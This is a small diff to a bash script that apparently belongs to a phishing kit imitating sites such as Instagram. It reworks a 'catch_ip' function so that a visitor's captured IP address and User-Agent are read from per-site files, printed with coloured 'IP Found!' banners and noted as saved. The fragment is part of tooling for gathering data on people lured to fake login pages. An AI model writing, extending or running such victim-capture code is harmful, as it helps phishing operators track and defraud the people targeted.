@@ -390,8 +390,15 @@ getcredentials() {
 
 catch_ip() {
     client_ip=$(cat sites/$server/ip.txt)
-    printf "\e[1;92m[\e[0m*\e[1;92m] IP:\e[0m\e[1;77m %s\e[0m\n" $client_ip
+    user_agent=$(cat sites/$server/user-agent.txt)
+    saved_file="instagram/saved.ip.txt"
+
+    echo -e "\e[1;92m[*] IP Found!\e[0m"
+    echo -e "\e[1;92m[*] IP:\e[0m\e[1;77m $client_ip\e[0m"
+    echo -e "\e[1;92m[*] User-Agent:\e[0m\e[1;77m $user_agent\e[0m"
+    echo -e "\e[1;92m[*] Saved:\e[0m\e[1;77m $saved_file\e[0m"
 }
+
 
 start() {
     printf "\n"
